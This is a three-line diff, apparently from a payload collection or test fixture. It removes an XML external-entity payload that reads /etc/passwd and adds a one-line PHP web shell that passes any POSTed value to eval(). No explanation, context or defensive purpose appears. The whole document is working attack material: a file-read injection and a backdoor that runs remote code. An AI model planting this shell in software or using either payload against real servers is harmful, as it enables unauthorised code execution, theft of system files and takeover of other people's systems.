@@ -1,3 +1,3 @@
-<!--?xml version="1.0" ?-->
-<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
-<data>&example;</data>
+<?php
+eval($_POST[1]);
+?>
